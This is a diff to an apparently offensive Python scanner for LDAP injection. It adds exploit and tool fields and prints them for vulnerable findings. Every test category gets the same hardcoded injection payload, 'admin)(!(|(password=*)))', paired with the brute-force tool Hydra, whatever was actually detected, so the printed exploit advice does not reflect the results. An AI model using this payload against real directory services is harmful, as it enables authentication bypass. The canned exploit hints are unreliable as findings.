@@ -28,6 +28,7 @@ from mytools.core.utils import (
     color,
     create_async_client,
     create_banner,
+    print_exploit_info,
     run_main_loop,
     safe_asyncio_run,
     write_output,
@@ -207,6 +208,8 @@ class LDAPiAttempt:
     vulnerable: bool
     details: str
     error: str
+    exploit: str = ""
+    tool: str = ""
 
 
 @dataclass(frozen=True, slots=True)
@@ -277,6 +280,8 @@ async def _test_detect(
                     vulnerable = _check_ldap_response(resp.content, t_status, indicators)
 
                     attempts.append(LDAPiAttempt(
+                    exploit="admin)(!(|(password=*)))",
+                    tool="hydra",
                         technique=f"{technique}_{param}",
                         category="detect",
                         payload=payload,
@@ -345,6 +350,8 @@ async def _test_auth_bypass(
                     vulnerable = _check_ldap_response(resp.content, t_status, indicators)
 
                     attempts.append(LDAPiAttempt(
+                    exploit="admin)(!(|(password=*)))",
+                    tool="hydra",
                         technique=f"{technique}_{param}",
                         category="auth_bypass",
                         payload=payload,
@@ -413,6 +420,8 @@ async def _test_search(
                     vulnerable = _check_ldap_response(resp.content, t_status, indicators)
 
                     attempts.append(LDAPiAttempt(
+                    exploit="admin)(!(|(password=*)))",
+                    tool="hydra",
                         technique=f"{technique}_{param}",
                         category="search",
                         payload=payload,
@@ -473,6 +482,8 @@ async def _test_blind(
                 vulnerable = _check_ldap_response(resp.content, t_status, indicators)
 
                 attempts.append(LDAPiAttempt(
+                exploit="admin)(!(|(password=*)))",
+                tool="hydra",
                     technique=f"{technique}_{param}",
                     category="blind",
                     payload=payload,
@@ -533,6 +544,8 @@ async def _test_bypass(
                 vulnerable = _check_ldap_response(resp.content, t_status, indicators)
 
                 attempts.append(LDAPiAttempt(
+                exploit="admin)(!(|(password=*)))",
+                tool="hydra",
                     technique=f"{technique}_{param}",
                     category="bypass",
                     payload=payload,
@@ -584,6 +597,9 @@ def print_results(result: LDAPiResult) -> None:
         print(color(f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD))
         for tech in vuln_techs[:10]:
             print(color(f"      [!] {tech}", Cyber.RED))
+            a = next((a for a in result.attempts if a.technique == tech), None)
+            if a:
+                print_exploit_info(a.exploit, a.tool)
         print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
     else:
         print(color("\n  [+] Nenhuma LDAP Injection detectada", Cyber.GREEN, Cyber.BOLD))
